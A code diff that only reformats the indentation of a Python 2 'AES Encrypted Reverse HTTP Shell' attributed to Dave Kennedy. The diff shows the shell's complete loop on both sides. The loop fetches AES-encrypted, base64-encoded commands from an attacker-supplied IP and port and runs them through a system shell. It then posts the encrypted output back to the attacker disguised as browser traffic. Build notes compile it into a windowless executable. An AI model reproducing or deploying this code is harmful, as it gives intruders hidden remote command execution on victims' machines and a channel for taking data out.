@@ -23,15 +23,15 @@
 #
 ##########################################################################################################################
 #
-# Below is the steps used to compile the binary. py2exe requires a dll to be used in conjunction 
-# so py2exe was not used. Instead, pyinstaller was used in order to byte compile the binary. 
+# Below is the steps used to compile the binary. py2exe requires a dll to be used in conjunction
+# so py2exe was not used. Instead, pyinstaller was used in order to byte compile the binary.
 #
 ##########################################################################################################################
 #
 # export VERSIONER_PYTHON_PREFER_32_BIT=yes
 # python Configure.py
 # python Makespec.py --onefile --noconsole shell.py
-# python Build.py shell/shell.spec                          
+# python Build.py shell/shell.spec
 #
 ###########################################################################################################################
 
@@ -79,54 +79,54 @@ PASSWORD = "password_here"
 
 # here is where we set all of our proxy settings
 if PROXY_SUPPORT == "ON":
-        auth_handler = urllib2.HTTPBasicAuthHandler()
-        auth_handler.add_password(realm='RESTRICTED ACCESS', uri=PROXY_URL,
-                                  user=USERNAME, passwd=PASSWORD)
-        opener = urllib2.build_opener(auth_handler)
-        urllib2.install_opener(opener) 
+    auth_handler = urllib2.HTTPBasicAuthHandler()
+    auth_handler.add_password(realm='RESTRICTED ACCESS', uri=PROXY_URL,
+                              user=USERNAME, passwd=PASSWORD)
+    opener = urllib2.build_opener(auth_handler)
+    urllib2.install_opener(opener)
 
 try:
-        # our reverse listener ip address
-        address = sys.argv[1]
-        # our reverse listener port address
-        port = sys.argv[2]
+    # our reverse listener ip address
+    address = sys.argv[1]
+    # our reverse listener port address
+    port = sys.argv[2]
 
 # except that we didn't pass parameters
 except IndexError:
-        print " \nAES Encrypted Reverse HTTP Shell by:"
-        print "        Dave Kennedy (ReL1K)"
-        print "      http://www.secmaniac.com"
-        print "Usage: shell.exe <reverse_ip_address> <rport>"
-        time.sleep(0.1)
-        sys.exit()
+    print " \nAES Encrypted Reverse HTTP Shell by:"
+    print "        Dave Kennedy (ReL1K)"
+    print "      http://www.secmaniac.com"
+    print "Usage: shell.exe <reverse_ip_address> <rport>"
+    time.sleep(0.1)
+    sys.exit()
 
 # loop forever
 while 1:
-        # open up our request handelr
-        req = urllib2.Request('http://%s:%s' % (address,port))
-        # grab our response which contains what command we want
-        message = urllib2.urlopen(req)
-        # base64 unencode
-        message = base64.b64decode(message.read())
-        # decrypt the communications
-        message = DecodeAES(cipher, message)
-        # quit out if we receive that command
-        if message == "quit" or message == "exit":
-                sys.exit()
-        # issue the shell command we want
-        message = message.replace("{", "")
-        proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        # read out the data of stdout
-        data = proc.stdout.read() + proc.stderr.read()
-        # encrypt the data
-        data = EncodeAES(cipher, data)
-        # base64 encode the data
-        data = base64.b64encode(data)
-        # urlencode the data from stdout
-        data = urllib.urlencode({'cmd': '%s'}) % (data)
-        # who we want to connect back to with the shell
-        h = httplib.HTTPConnection('%s:%s' % (address,port))
-        # set our basic headers
-        headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
-        # actually post the data
-        h.request('POST', '/index.aspx', data, headers)
+    # open up our request handelr
+    req = urllib2.Request('http://%s:%s' % (address,port))
+    # grab our response which contains what command we want
+    message = urllib2.urlopen(req)
+    # base64 unencode
+    message = base64.b64decode(message.read())
+    # decrypt the communications
+    message = DecodeAES(cipher, message)
+    # quit out if we receive that command
+    if message == "quit" or message == "exit":
+        sys.exit()
+    # issue the shell command we want
+    message = message.replace("{", "")
+    proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    # read out the data of stdout
+    data = proc.stdout.read() + proc.stderr.read()
+    # encrypt the data
+    data = EncodeAES(cipher, data)
+    # base64 encode the data
+    data = base64.b64encode(data)
+    # urlencode the data from stdout
+    data = urllib.urlencode({'cmd': '%s'}) % (data)
+    # who we want to connect back to with the shell
+    h = httplib.HTTPConnection('%s:%s' % (address,port))
+    # set our basic headers
+    headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
+    # actually post the data
+    h.request('POST', '/index.aspx', data, headers)
